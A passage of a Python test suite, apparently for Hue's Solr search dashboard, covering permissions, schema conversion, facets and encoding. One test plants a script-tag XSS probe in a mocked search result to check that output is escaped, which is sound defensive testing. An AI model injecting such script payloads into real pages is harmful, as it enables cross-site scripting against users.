controller.get_search_collections()\n    assert_equal(len(hue_collections), 2)\n\n    hue_collections = controller.get_owner_search_collections()\n    assert_equal(len(hue_collections), 1)\n    assert_equal(hue_collections[0].name, 'test_dashboard1')\n\n    hue_collections = controller.get_shared_search_collections()\n    assert_equal(len(hue_collections), 1)\n    assert_equal(hue_collections[0].name, 'test_dashboard1')\n\n    # For self.user\n    controller = DashboardController(self.user)\n    hue_collections = controller.get_search_collections()\n    assert_equal(len(hue_collections), 2)\n\n    hue_collections = controller.get_owner_search_collections()\n    assert_equal(len(hue_collections), 1)\n    assert_equal(hue_collections[0].name, 'test_dashboard')\n\n    hue_collections = controller.get_shared_search_collections()\n    assert_equal(len(hue_collections), 1)\n    assert_equal(hue_collections[0].name, 'test_dashboard')\n\n\n  def test_update_document(self):\n    # Regular user\n    response = self.c.post(reverse('dashboard:update_document'), {\n        'collection': json.dumps(self._get_collection_param(self.collection)),\n        'document': json.dumps({'hasChanged': False})\n    })\n\n    data = json.loads(response.content)\n    assert_equal(-1, data['status'], response.content)\n    assert_true('denied' in data['message'], response.content)\n\n    # Admin\n    c = make_logged_in_client(username='admin', is_superuser=True, recreate=True)\n    response = c.post(reverse('dashboard:update_document'), {\n        'collection': json.dumps(self._get_collection_param(self.collection)),\n        'document': json.dumps({'hasChanged': False})\n    })\n\n    data = json.loads(response.content)\n    assert_equal(0, data['status'], response.content)\n    assert_true('no modifications to change' in data['message'], response.content)\n\n  def test_strip_nulls(self):\n    response = '{\"uid\":\"1111111\",\"method\":\"check_user\"}\\x00'\n    response = json.loads(response.replace('\\x00', '')) # Does not call real API\n\n  def test_convert_schema_fields_to_luke(self):\n    schema_fields = {u'fields': [\n        {u'indexed': True, u'stored': True, u'type': u'long', u'name': u'_version_'},\n        {u'indexed': True, u'stored': True, u'required': True, u'type': u'tdate', u'name': u'created_at'},\n        {u'indexed': True, u'stored': True, u'required': True, u'type': u'string', u'name': u'expanded_url'},\n        {u'uniqueKey': True, u'name': u'id', u'required': True, u'stored': True, u'indexed': True, u'type': u'tlong'},\n        {u'indexed': True, u'stored': True, u'required': True, u'type': u'tlong', u'name': u'in_reply_to_status_id'},\n        {u'indexed': True, u'stored': True, u'required': True, u'type': u'tint', u'name': u'in_reply_to_user_id'},\n        {u'indexed': True, u'stored': True, u'required': True, u'type': u'string', u'name': u'media_url_https'},\n        {u'indexed': True, u'stored': True, u'required': True, u'type': u'tint', u'name': u'retweet_count'},\n        {u'indexed': True, u'stored': True, u'required': True, u'type': u'text_general', u'name': u'source'},\n        {u'indexed': True, u'stored': True, u'required': True, u'type': u'text_general', u'name': u'text'},\n        {u'indexed': True, u'stored': True, u'required': True, u'type': u'tint', u'name': u'user_followers_count'},\n        {u'indexed': True, u'stored': True, u'required': True, u'type': u'tint', u'name': u'user_friends_count'},\n        {u'indexed': True, u'stored': True, u'required': True, u'type': u'string', u'name': u'user_location'},\n        {u'indexed': True, u'stored': True, u'required': True, u'type': u'text_general', u'name': u'user_name'},\n        {u'indexed': True, u'stored': True, u'required': True, u'type': u'string', u'name': u'user_screen_name'},\n        {u'indexed': True, u'stored': True, u'required': True, u'type': u'tint', u'name': u'user_statuses_count'}\n        ], u'responseHeader': {u'status': 0, u'QTime': 1}\n    }\n    assert_equal([\n        {'uniqueKey': None, 'copySources': [], 'flags': u'I-S-----OF-----l', 'required': True, 'type': u'long', u'copyDests': []},\n        {'uniqueKey': None, 'copySources': [], 'flags': u'I-S-----OF-----l', 'required': True, 'type': u'string', u'copyDests': []},\n        {'uniqueKey': None, 'copySources': [], 'flags': u'I-S-----OF-----l', 'required': True, 'type': u'string', u'copyDests': []},\n        {'uniqueKey': None, 'copySources': [], 'flags': u'I-S-----OF-----l', 'required': True, 'type': u'string', u'copyDests': []},\n        {'uniqueKey': None, 'copySources': [], 'flags': u'I-S-----OF-----l', 'required': True, 'type': u'string', u'copyDests': []},\n        {'uniqueKey': None, 'copySources': [], 'flags': u'I-S-----OF-----l', 'required': True, 'type': u'tdate', u'copyDests': []},\n        {'uniqueKey': None, 'copySources': [], 'flags': u'I-S-----OF-----l', 'required': True, 'type': u'text_general', u'copyDests': []},\n        {'uniqueKey': None, 'copySources': [], 'flags': u'I-S-----OF-----l', 'required': True, 'type': u'text_general', u'copyDests': []},\n        {'uniqueKey': None, 'copySources': [], 'flags': u'I-S-----OF-----l', 'required': True, 'type': u'text_general', u'copyDests': []},\n        {'uniqueKey': None, 'copySources': [], 'flags': u'I-S-----OF-----l', 'required': True, 'type': u'tint', u'copyDests': []},\n        {'uniqueKey': None, 'copySources': [], 'flags': u'I-S-----OF-----l', 'required': True, 'type': u'tint', u'copyDests': []},\n        {'uniqueKey': None, 'copySources': [], 'flags': u'I-S-----OF-----l', 'required': True, 'type': u'tint', u'copyDests': []},\n        {'uniqueKey': None, 'copySources': [], 'flags': u'I-S-----OF-----l', 'required': True, 'type': u'tint', u'copyDests': []},\n        {'uniqueKey': None, 'copySources': [], 'flags': u'I-S-----OF-----l', 'required': True, 'type': u'tint', u'copyDests': []},\n        {'uniqueKey': None, 'copySources': [], 'flags': u'I-S-----OF-----l', 'required': True, 'type': u'tlong', u'copyDests': []},\n        {'uniqueKey': True, 'copySources': [], 'flags': u'I-S-----OF-----l', 'required': True, 'type': u'tlong', u'copyDests': []}\n        ],\n        sorted(Collection2._make_luke_from_schema_fields(schema_fields).values())\n    )\n\n  def test_response_escaping_multi_value(self):\n    MockResource.set_solr_response(\"\"\"{\n      \"responseHeader\": {\n        \"status\": 0,\n        \"QTime\": 0,\n        \"params\": {\n          \"indent\": \"true\",\n          \"q\": \"*:*\",\n          \"_\": \"1442953203972\",\n          \"wt\": \"json\"\n        }\n      },\n      \"response\": {\n        \"numFound\": 1,\n        \"start\": 0,\n        \"docs\": [\n          {\n            \"id\": \"change.me\",\n            \"title\": [\n              \"val1\",\n              \"val2\",\n              \"[<script>alert(123)</script>]\",\n              \"val4\"\n            ],\n            \"_version_\": 1513046095083602000\n          }\n        ]\n      }\n    }\"\"\")\n\n    response = self.c.post(reverse('dashboard:search'), {\n        'collection': json.dumps(self._get_collection_param(self.collection)),\n        'query': json.dumps(QUERY)\n    })\n\n    result = json.loads(response.content)\n    assert_equal(\n        [{'hueId': 'change.me', 'id': 'change.me', '_version_': 1513046095083602000, 'title': ['val1', 'val2', '[&lt;script&gt;alert(123)&lt;/script&gt;]', 'val4'], 'details': [], 'externalLink': None}],\n        result['response']['docs']\n    )\n\n  def test_response_with_facets(self):\n    MockResource.set_solr_response(\"\"\"{\"responseHeader\":{\"status\":0,\"QTime\":59,\"params\":{\"facet\":\"true\",\"facet.mincount\":\"1\",\"facet.limit\":\"100\",\"facet.date\":\"article_date\",\"f.article_date.facet.date.start\":\"NOW-7MONTH/DAYS\",\"wt\":\"json\",\"rows\":\"15\",\"user.name\":\"hue\",\"start\":\"0\",\"facet.sort\":\"count\",\"q\":\"*:*\",\"f.article_date.facet.date.end\":\"NOW-5MONTH\",\"doAs\":\"romain\",\"f.article_date.facet.date.gap\":\"+1DAYS\",\"facet.field\":[\"journal_title\",\"author_facet\"],\"fq\":[\"article_date:[2013-06-13T00:00:00Z TO 2013-06-13T00:00:00Z+1DAYS]\",\"journal_title:\\\\\"in\\\\\"\"]}},\"response\":{\"numFound\":4,\"start\":0,\"maxScore\":1.0,\"docs\":[{\"article_title\":\"Investigations for neonatal seizures.\",\"journal_issn\":\"1878-0946\",\"article_abstract_text\":[\"Seizures during the neonatal period are always medical emergencies. Apart from the need for rapid anticonvulsive treatment, the underlying condition is often not immediately obvious. In the search for the correct diagnosis, a thorough history, clinical examination, laboratory work-up, neurophysiological and neuroradiological investigations are all essential. A close collaboration between neonatologists, neuropaediatricians, laboratory specialists, neurophysiologists and radiologists facilitates the adequate care of the infant.\"],\"ontologies\":[\"36481|1 \"],\"article_date\":\"2013-06-13T00:00:00Z\",\"journal_title\":\"Seminars in fetal & neonatal medicine\",\"date_created\":\"2013-08-22T00:00:00Z\",\"journal_country\":\"Netherlands\",\"journal_iso_abbreviation\":\"Semin Fetal Neonatal Med\",\"id\":\"23680099\",\"author\":[\"B B Hallberg\",\"M M Blennow\"],\"article_pagination\":\"196-201\",\"journal_publication_date\":\"2013-08-22T00:00:00Z\",\"affiliation\":\"Department of Neonatology, Karolinska Institutet and University Hospital, Stockholm, Sweden. boubou.hallberg@ki.se\",\"language\":\"eng\",\"_version_\":1450807641462800385},{\"article_title\":\"Enantiomeric selection properties of \u03b2-homoDNA: enhanced pairing for heterochiral complexes.\",\"journal_issn\":\"1521-3773\",\"article_date\":\"2013-06-13T00:00:00Z\",\"journal_title\":\"Angewandte Chemie (International ed. in English)\",\"date_created\":\"2013-07-20T00:00:00Z\",\"journal_country\":\"Germany\",\"journal_iso_abbreviation\":\"Angew. Chem. Int. Ed. Engl.\",\"id\":\"23670912\",\"author\":[\"Daniele D D'Alonzo\",\"Jussara J Amato\",\"Guy G Schepers\",\"Matheus M Froeyen\",\"Arthur A Van Aerschot\",\"Piet P Herdewijn\",\"Annalisa A Guaragna\"],\"article_pagination\":\"6662-5\",\"journal_publication_date\":\"2013-06-24T00:00:00Z\",\"affiliation\":\"Dipartimento di Scienze Chimiche, Universit\u00e0 degli Studi di Napoli Federico II, Via Cintia 21, 80126 Napoli, Italy. dandalonzo@unina.it\",\"language\":\"eng\",\"_version_\":1450807661929955329},{\"article_title\":\"Interference of bacterial cell-to-cell communication: a new concept of antimicrobial chemotherapy breaks antibiotic resistance.\",\"journal_issn\":\"1664-302X\",\"article_abstract_text\":[\"Bacteria use a cell-to-cell communication activity termed \\\\\"quorum sensing\\\\\" to coordinate group behaviors in a cell density dependent manner. Quorum sensing influences the expression profile of diverse genes, including antibiotic tolerance and virulence determinants, via specific chemical compounds called \\\\\"autoinducers\\\\\". During quorum sensing, Gram-negative bacteria typically use an acylated homoserine lactone (AHL) called autoinducer 1. Since the first discovery of quorum sensing in a marine bacterium, it has been recognized that more than 100 species possess this mechanism of cell-to-cell communication. In addition to being of interest from a biological standpoint, quorum sensing is a potential target for antimicrobial chemotherapy. This unique concept of antimicrobial control relies on reducing the burden of virulence rather than killing the bacteria. It is believed that this approach will not only suppress the development of antibiotic resistance, but will also improve the treatment of refractory infections triggered by multi-drug resistant pathogens. In this paper, we review and track recent progress in studies on AHL inhibitors/modulators from a biological standpoint. It has been discovered that both natural and synthetic compounds can disrupt quorum sensing by a variety of means, such as jamming signal transduction, inhibition of signal production and break-down and trapping of signal compounds. We also focus on the regulatory elements that attenuate quorum sensing activities and discuss their unique properties. Understanding the biological roles of regulatory elements might be useful in developing inhibitor applications and understanding how quorum sensing is controlled.\"],\"ontologies\":[\"2402|1 \",\"1875|1 \",\"2047|3 \",\"36690|1 \",\"8120|1 \",\"1872|1 \",\"1861|1 \",\"1955|2 \",\"38027|1 \",\"3853|1 \",\"2237|3 \",\"37074|1 \",\"3043|2 \",\"36478|1 \",\"4403|1 \",\"2751|1 \",\"10751|1 \",\"36467|1 \",\"2387|1 \",\"7278|3 \",\"3826|1 \"],\"article_date\":\"2013-06-13T00:00:00Z\",\"journal_title\":\"Frontiers in microbiology\",\"date_created\":\"2013-06-30T00:00:00Z\",\"journal_country\":\"Switzerland\",\"journal_iso_abbreviation\":\"Front Microbiol\",\"id\":\"23720655\",\"author\":[\"Hidetada H Hirakawa\",\"Haruyoshi H Tomita\"],\"article_pagination\":\"114\",\"journal_publication_date\":\"2013-09-13T00:00:00Z\",\"affiliation\":\"Advanced Scientific Research Leaders Development Unit, Gunma University Maebashi, Gunma, Japan.\",\"language\":\"eng\",\"_version_\":1450807662055784448},{\"article_title\":\"The role of musical training in emergent and event-based timing.\",\"journal_issn\":\"1662-5161\",\"article_abstract_text\":[\"Introduction: Musical performance is thought to rely predominantly on event-based timing involving a clock-like neural process and an explicit internal representation of the time interval. Some aspects of musical performance may rely on emergent timing, which is established through the optimization of movement kinematics, and can be maintained without reference to any explicit representation of the time interval. We predicted that musical training would have its largest effect on event-based timing, supporting the dissociability of these timing processes and the dominance of event-based timing in musical performance. Materials and Methods: We compared 22 musicians and 17 non-musicians on the prototypical event-based timing task of finger tapping and on the typically emergently timed task of circle drawing. For each task, participants first responded in synchrony with a metronome (Paced) and then responded at the same rate without the metronome (Unpaced). Results: Analyses of the Unpaced phase revealed that non-musicians were more variable in their inter-response intervals for finger tapping compared to circle drawing. Musicians did not differ between the two tasks. Between groups, non-musicians were more variable than musicians for tapping but not for drawing. We were able to show that the differences were due to less timer variability in musicians on the tapping task. Correlational analyses of movement jerk and inter-response interval variability revealed a negative association for tapping and a positive association for drawing in non-musicians only. Discussion: These results suggest that musical training affects temporal variability in tapping but not drawing. Additionally, musicians and non-musicians may be employing different movement strategies to maintain accurate timing in the two tasks. These findings add to our understanding of how musical training affects timing and support the dissociability of event-based and emergent timing modes.\"],\"ontologies\":[\"36810|1 \",\"49002|1 \",\"3132|1 \",\"3797|1 \",\"37953|1 \",\"36563|2 \",\"524|1 \",\"3781|1 \",\"2848|1 \",\"17163|1 \",\"17165|1 \",\"49010|1 \",\"36647|3 \",\"36529|1 \",\"2936|1 \",\"2643|1 \",\"714|1 \",\"3591|1 \",\"2272|1 \",\"3103|1 \",\"2265|1 \",\"37051|1 \",\"3691|1 \"],\"article_date\":\"2013-06-14T00:00:00Z\",\"journal_title\":\"Frontiers in human neuroscience\",\"date_created\":\"2013-06-29T00:00:00Z\",\"journal_country\":\"Switzerland\",\"journal_iso_abbreviation\":\"Front Hum Neurosci\",\"id\":\"23717275\",\"author\":[\"L H LH Baer\",\"J L N JL Thibodeau\",\"T M TM Gralnick\",\"K Z H KZ Li\",\"V B VB Penhune\"],\"article_pagination\":\"191\",\"journal_publication_date\":\"2013-09-13T00:00:00Z\",\"affiliation\":\"Department of Psychology, Centre for Research in Human Development, Concordia University Montr\u00e9al, QC, Canada.\",\"language\":\"eng\",\"_version_\":1450807667479019520}]},\"facet_counts\":{\"facet_queries\":{},\"facet_fields\":{\"journal_title\":[\"in\",4,\"frontiers\",2,\"angewandte\",1,\"chemie\",1,\"ed\",1,\"english\",1,\"fetal\",1,\"human\",1,\"international\",1,\"medicine\",1,\"microbiology\",1,\"neonatal\",1,\"neuroscience\",1,\"seminars\",1],\"author_facet\":[\"Annalisa A Guaragna\",1,\"Arthur A Van Aerschot\",1,\"B B Hallberg\",1,\"Daniele D D'Alonzo\",1,\"Guy G Schepers\",1,\"Haruyoshi H Tomita\",1,\"Hidetada H Hirakawa\",1,\"J L N JL Thibodeau\",1,\"Jussara J Amato\",1,\"K Z H KZ Li\",1,\"L H LH Baer\",1,\"M M Blennow\",1,\"Matheus M Froeyen\",1,\"Piet P Herdewijn\",1,\"T M TM Gralnick\",1,\"V B VB Penhune\",1]},\"facet_dates\":{\"article_date\":{\"gap\":\"+1DAYS\",\"start\":\"2013-04-27T00:00:00Z\",\"end\":\"2013-06-28T00:00:00Z\"}},\"facet_ranges\":{}},\"highlighting\":{\"23680099\":{},\"23670912\":{},\"23720655\":{},\"23717275\":{}},\"spellcheck\":{\"suggestions\":[\"correctlySpelled\",false]}}\"\"\")\n\n    # journal_title facet + date range article_date facets clicked and author_facet not clicked\n    # http://solr:8983/solr/articles/select?user.name=hue&doAs=romain&q=%2A%3A%2A&wt=json&rows=15&start=0&facet=true&facet.mincount=1&facet.limit=100&facet.sort=count&facet.field=journal_title&facet.field=author_facet&facet.date=article_date&f.article_date.facet.date.start=NOW-7MONTH%2FDAYS&f.article_date.facet.date.end=NOW-5MONTH&f.article_date.facet.date.gap=%2B1DAYS&fq=article_date%3A%5B2013-06-13T00%3A00%3A00Z+TO+2013-06-13T00%3A00%3A00Z%2B1DAYS%5D&fq=journal_title%3A%22in%22\n    response = self.c.post(reverse('dashboard:search'), {\n        'collection': json.dumps(self._get_collection_param(self.collection)),\n        'query': json.dumps(QUERY)\n    })\n\n    assert_false('alert alert-error' in response.content, response.content)\n\n    assert_true('author_facet' in response.content, response.content)\n    assert_true('Annalisa A Guaragna' in response.content, response.content)\n\n    assert_true('journal_title' in response.content, response.content)\n    assert_true('Angewandte' in response.content, response.content)\n\n    assert_true('\"numFound\": 4' in response.content, response.content)\n\n  def test_response_highlighting_with_binary_value(self):\n    MockResource.set_solr_response(\"\"\"{\"responseHeader\":{\"status\":0,\"QTime\":23,\"params\":{\"hl.fragsize\":\"1000\",\"fl\":\"*\",\"hl.snippets\":\"5\",\"start\":\"0\",\"user.name\":\"hue\",\"q\":\"*:*\",\"doAs\":\"romain\",\"hl.fl\":\"*\",\"wt\":\"json\",\"hl\":\"true\",\"rows\":\"2\"}},\"response\":{\"numFound\":494,\"start\":0,\"docs\":[{\"id\":\"#31;\ufffd#8;w)\ufffdU#3;333320442\ufffd#2;\ufffd#27;\ufffdv\",\"last_name\":\"Ogh\",\"gpa\":\"3.88\",\"first_name\":\"Eirjish\",\"age\":\"12\",\"_version_\":1508697786597507072},{\"id\":\"#31;\ufffd#8;w)\ufffdU#3;344\ufffd457\ufffd4\ufffd#2;r\ufffd\ufffd\",\"last_name\":\"Ennjth\",\"gpa\":\"1.22\",\"first_name\":\"Oopob\",\"age\":\"14\",\"_version_\":1508697786815610880}]},\"facet_counts\":{\"facet_queries\":{},\"facet_fields\":{\"id\":[\"31\",485,\"8\",485,\"u\",485,\"2\",461,\"x\",308,\"w\",145,\"3\",123,\"4\",90,\"3;3\",81,\"0\",76,\"y\",46,\"41\",15,\"16\",14,\"42\",14,\"05\",12,\"7\",12,\"04\",11,\"15\",11,\"3;31\",11,\"44\",11,\"45\",11,\"i\",11,\"n\",11,\"s\",11,\"03\",10,\"07\",10,\"11\",10,\"28\",10,\"30\",10,\"3;34\",10,\"46\",10,\"a\",10,\"c\",10,\"j\",10,\"v\",10,\"02\",9,\"1\",9,\"26\",9,\"6\",9,\"e\",9,\"f\",9,\"p\",9,\"z\",9,\"00\",8,\"06\",8,\"14\",8,\"43\",8,\"g\",8,\"h\",8,\"r\",8,\"20\",7,\"23\",7,\"29\",7,\"3;37\",7,\"40\",7,\"k\",7,\"01\",6,\"17\",6,\"22\",6,\"24\",6,\"27\",6,\"3;35\",6,\"3;36\",6,\"b\",6,\"12\",5,\"19\",5,\"21\",5,\"3;323\",5,\"3;33\",5,\"47\",5,\"5\",5,\"o\",5,\"18\",4,\"25\",4,\"2;6\",4,\"3;32\",4,\"3;360\",4,\"3;372\",4,\"d\",4,\"q\",4,\"t\",4,\"005\",3,\"2;3\",3,\"3;311\",3,\"3;343\",3,\"3;344\",3,\"3;373\",3,\"420\",3,\"471\",3,\"9\",3,\"l\",3,\"m\",3,\"0147\",2,\"020\",2,\"022\",2,\"031\",2,\"065\",2,\"070\",2,\"2;0\",2,\"2;5\",2],\"first_name\":[\"unt\",3,\"at\",2,\"aut\",2,\"eigh\",2,\"jh\",2,\"jir\",2,\"jz\",2,\"oim\",2,\"oith\",2,\"onn\",2,\"ouz\",2,\"um\",2,\"veitt\",2,\"16\",1,\"21\",1,\"28\",1,\"30\",1,\"achunn\",1,\"ad\",1,\"agauz\",1,\"agur\",1,\"aibenn\",1,\"aich\",1,\"aichaum\",1,\"aigh\",1,\"aim\",1,\"aimoob\",1,\"ainn\",1,\"aipf\",1,\"aipfouv\",1,\"aisainn\",1,\"aistjs\",1,\"aith\",1,\"aitoum\",1,\"aittool\",1,\"aittoupf\",1,\"aiw\",1,\"ak\",1,\"al\",1,\"apf\",1,\"astjist\",1,\"ataiv\",1,\"att\",1,\"auchav\",1,\"auchib\",1,\"auchih\",1,\"aud\",1,\"audaush\",1,\"auh\",1,\"auhour\",1,\"aum\",1,\"aunnoiss\",1,\"aunopf\",1,\"aupev\",1,\"aus\",1,\"ausaust\",1,\"austour\",1,\"ausyv\",1,\"auth\",1,\"authep\",1,\"auttjich\",1,\"auttjir\",1,\"av\",1,\"besooz\",1,\"bjfautt\",1,\"bjichaub\",1,\"bjittyl\",1,\"bjtoopf\",1,\"bleiss\",1,\"blistoot\",1,\"blittaub\",1,\"bljip\",1,\"bljir\",1,\"bloich\",1,\"bluhaid\",1,\"bluth\",1,\"breirjd\",1,\"breiter\",1,\"breitt\",1,\"breth\",1,\"brjishaip\",1,\"broil\",1,\"broopfoul\",1,\"brooputt\",1,\"brooroog\",1,\"brot\",1,\"brych\",1,\"brykaub\",1,\"brypfop\",1,\"bunn\",1,\"byroigh\",1,\"c\",1,\"caugh\",1,\"cautt\",1,\"chaittoif\",1,\"chaupour\",1,\"chautoonn\",1,\"chech\",1,\"cheigh\",1,\"chet\",1],\"last_name\":[\"it\",3,\"ooz\",3,\"yss\",3,\"aih\",2,\"aim\",2,\"ash\",2,\"foum\",2,\"ig\",2,\"jch\",2,\"jif\",2,\"jis\",2,\"jiv\",2,\"jiw\",2,\"js\",2,\"oh\",2,\"ouf\",2,\"uch\",2,\"ud\",2,\"uf\",2,\"ul\",2,\"ush\",2,\"ys\",2,\"ab\",1,\"ach\",1,\"afoust\",1,\"aghaush\",1,\"aib\",1,\"aihjiss\",1,\"aimoint\",1,\"ain\",1,\"aineip\",1,\"ainn\",1,\"aint\",1,\"aintuf\",1,\"aipfes\",1,\"aipfjf\",1,\"air\",1,\"aish\",1,\"aishoott\",1,\"aishutt\",1,\"aisjnn\",1,\"aisseih\",1,\"aissutt\",1,\"aistaif\",1,\"aith\",1,\"aithjib\",1,\"aiv\",1,\"aiw\",1,\"aiz\",1,\"aizyb\",1,\"alyk\",1,\"ap\",1,\"apf\",1,\"apount\",1,\"assyv\",1,\"ast\",1,\"at\",1,\"atook\",1,\"att\",1,\"audal\",1,\"aug\",1,\"auk\",1,\"auloost\",1,\"aupfoitt\",1,\"aupjish\",1,\"aur\",1,\"aus\",1,\"authood\",1,\"auttyst\",1,\"auvjb\",1,\"auvon\",1,\"auzigh\",1,\"az\",1,\"besh\",1,\"birus\",1,\"bjit\",1,\"bjz\",1,\"blaich\",1,\"blaipf\",1,\"bleiz\",1,\"blikjigh\",1,\"bloob\",1,\"blouth\",1,\"boobjist\",1,\"boontoih\",1,\"boub\",1,\"bouch\",1,\"braul\",1,\"braut\",1,\"breinnyz\",1,\"brishoog\",1,\"brithith\",1,\"brjint\",1,\"brjth\",1,\"brubeist\",1,\"brugh\",1,\"bryvaip\",1,\"byl\",1,\"caleid\",1,\"ceir\",1],\"age\":[\"12\",60,\"18\",57,\"14\",56,\"10\",54,\"11\",53,\"13\",52,\"16\",50,\"15\",49,\"17\",44],\"gpa\":[\"2.34\",6,\"1.01\",5,\"1.43\",5,\"3.04\",5,\"3.14\",5,\"3.17\",5,\"3.87\",5,\"1.61\",4,\"2.24\",4,\"2.73\",4,\"2.76\",4,\"2.97\",4,\"3.28\",4,\"3.29\",4,\"3.35\",4,\"3.39\",4,\"3.67\",4,\"3.78\",4,\"3.85\",4,\"1.05\",3,\"1.1\",3,\"1.13\",3,\"1.22\",3,\"1.25\",3,\"1.3\",3,\"1.34\",3,\"1.37\",3,\"1.38\",3,\"1.39\",3,\"1.4\",3,\"1.44\",3,\"1.46\",3,\"1.53\",3,\"1.54\",3,\"1.55\",3,\"1.67\",3,\"1.72\",3,\"1.82\",3,\"1.91\",3,\"1.93\",3,\"11.0\",3,\"2.09\",3,\"2.11\",3,\"2.23\",3,\"2.26\",3,\"2.29\",3,\"2.46\",3,\"2.62\",3,\"2.71\",3,\"2.78\",3,\"2.79\",3,\"2.83\",3,\"2.84\",3,\"2.85\",3,\"2.92\",3,\"3.09\",3,\"3.11\",3,\"3.13\",3,\"3.23\",3,\"3.44\",3,\"3.76\",3,\"3.82\",3,\"3.88\",3,\"3.89\",3,\"3.92\",3,\"3.97\",3,\"4.0\",3,\"1.02\",2,\"1.11\",2,\"1.23\",2,\"1.26\",2,\"1.28\",2,\"1.35\",2,\"1.48\",2,\"1.56\",2,\"1.59\",2,\"1.63\",2,\"1.79\",2,\"1.8\",2,\"1.81\",2,\"1.97\",2,\"16.0\",2,\"2.01\",2,\"2.03\",2,\"2.05\",2,\"2.08\",2,\"2.12\",2,\"2.14\",2,\"2.17\",2,\"2.2\",2,\"2.25\",2,\"2.3\",2,\"2.35\",2,\"2.36\",2,\"2.41\",2,\"2.47\",2,\"2.49\",2,\"2.51\",2,\"2.54\",2,\"2.56\",2],\"date1\":[],\"date2\":[],\"country\":[],\"state\":[],\"city\":[],\"latitude\":[],\"longitude\":[]},\"facet_dates\":{},\"facet_ranges\":{},\"facet_intervals\":{}},\"highlighting\":{\"#31;\ufffd#8;w)\ufffdU#3;333320442\ufffd#2;\ufffd#27;\ufffdv\":{},\"#31;\ufffd#8;w)\ufffdU#3;344\ufffd457\ufffd4\ufffd#2;r\ufffd\ufffd\":{}}}\"\"\")\n\n    response = self.c.post(reverse('dashboard:search'), {\n        'collection': json.dumps(self._get_collection_param(self.collection)),\n        'query': json.dumps(QUERY)\n    })\n\n    assert_false('alert alert-error' in response.content, response.content)\n    assert_false(\"'ascii' codec can't encode character u'\\ufffd' in position\" in response.content, response.content)\n\n    assert_true('bluhaid' in response.content, response.content)\n\n  def test_get_collection_fields(self):\n    MockResource.set_solr_response(\"\"\"{\"responseHeader\":{\"status\":0,\"QTime\":8},\"index\":{\"numDocs\":8,\"maxDoc\":8,\"deletedDocs\":0,\"version\":15,\"segmentCount\":5,\"current\":true,\"hasDeletions\":false,\"directory\":\"org.apache.lucene.store.NRTCachingDirectory:NRTCachingDirectory(org.apache.solr.store.hdfs.HdfsDirectory@5efe087b lockFactory=org.apache.solr.store.hdfs.HdfsLockFactory@5106def2; maxCacheMB=192.0 maxMergeSizeMB=16.0)\",\"userData\":{\"commitTimeMSec\":\"1389233070579\"},\"lastModified\":\"2014-01-09T02:04:30.579Z\"},\"fields\":{\"_version_\":{\"type\":\"long\",\"schema\":\"ITS-----OF------\",\"index\":\"-TS-------------\",\"docs\":8,\"distinct\":8,\"topTerms\":[\"1456716393276768256\",1,\"1456716398067712000\",1,\"1456716401465098240\",1,\"1460689159964327936\",1,\"1460689159981105152\",1,\"1460689159988445184\",1,\"1460689159993688064\",1,\"1456716273606983680\",1],\"histogram\":[\"1\",8]},\"cat\":{\"type\":\"string\",\"schema\":\"I-S-M---OF-----l\",\"index\":\"ITS-----OF------\",\"docs\":4,\"distinct\":1,\"topTerms\":[\"currency\",4],\"histogram\":[\"1\",0,\"2\",0,\"4\",1]},\"features\":{\"type\":\"text_general\",\"schema\":\"ITS-M-----------\",\"index\":\"ITS-------------\",\"docs\":4,\"distinct\":3,\"topTerms\":[\"coins\",4,\"notes\",4,\"and\",4],\"histogram\":[\"1\",0,\"2\",0,\"4\",3]},\"id\":{\"type\":\"string\",\"schema\":\"I-S-----OF-----l\",\"index\":\"ITS-----OF------\",\"docs\":8,\"distinct\":8,\"topTerms\":[\"GBP\",1,\"NOK\",1,\"USD\",1,\"change.me\",1,\"change.me1\",1,\"change.me112\",1,\"change.me12\",1,\"EUR\",1],\"histogram\":[\"1\",8]},\"inStock\":{\"type\":\"boolean\",\"schema\":\"I-S-----OF-----l\",\"index\":\"ITS-----OF------\",\"docs\":4,\"distinct\":1,\"topTerms\":[\"true\",4],\"histogram\":[\"1\",0,\"2\",0,\"4\",1]},\"manu\":{\"type\":\"text_general\",\"schema\":\"ITS-----O-------\",\"index\":\"ITS-----O-------\",\"docs\":4,\"distinct\":7,\"topTerms\":[\"of\",2,\"bank\",2,\"european\",1,\"norway\",1,\"u.k\",1,\"union\",1,\"america\",1],\"histogram\":[\"1\",5,\"2\",2]},\"manu_exact\":{\"type\":\"string\",\"schema\":\"I-------OF-----l\",\"index\":\"(unstored field)\",\"docs\":4,\"distinct\":4,\"topTerms\":[\"Bank of Norway\",1,\"European Union\",1,\"U.K.\",1,\"Bank of America\",1],\"histogram\":[\"1\",4]},\"manu_id_s\":{\"type\":\"string\",\"schema\":\"I-S-----OF-----l\",\"dynamicBase\":\"*_s\",\"index\":\"ITS-----OF------\",\"docs\":4,\"distinct\":4,\"topTerms\":[\"eu\",1,\"nor\",1,\"uk\",1,\"boa\",1],\"histogram\":[\"1\",4]},\"name\":{\"type\":\"text_general\",\"schema\":\"ITS-------------\",\"index\":\"ITS-------------\",\"docs\":4,\"distinct\":6,\"topTerms\":[\"one\",4,\"euro\",1,\"krone\",1,\"dollar\",1,\"pound\",1,\"british\",1],\"histogram\":[\"1\",5,\"2\",0,\"4\",1]},\"price_c\":{\"type\":\"currency\",\"schema\":\"I-S------F------\",\"dynamicBase\":\"*_c\"},\"price_c____amount_raw\":{\"type\":\"amount_raw_type_tlong\",\"schema\":\"IT------O-------\",\"dynamicBase\":\"*____amount_raw\",\"index\":\"(unstored field)\",\"docs\":4,\"distinct\":8,\"topTerms\":[\"0\",4,\"0\",4,\"0\",4,\"0\",4,\"0\",4,\"0\",4,\"0\",4,\"100\",4],\"histogram\":[\"1\",0,\"2\",0,\"4\",8]},\"price_c____currency\":{\"type\":\"currency_type_string\",\"schema\":\"I-------O-------\",\"dynamicBase\":\"*____currency\",\"index\":\"(unstored field)\",\"docs\":4,\"distinct\":4,\"topTerms\":[\"GBP\",1,\"NOK\",1,\"USD\",1,\"EUR\",1],\"histogram\":[\"1\",4]},\"romain_t\":{\"type\":\"text_general\",\"schema\":\"ITS-------------\",\"dynamicBase\":\"*_t\",\"index\":\"ITS-------------\",\"docs\":1,\"distinct\":1,\"topTerms\":[\"true\",1],\"histogram\":[\"1\",1]},\"text\":{\"type\":\"text_general\",\"schema\":\"IT--M-----------\",\"index\":\"(unstored 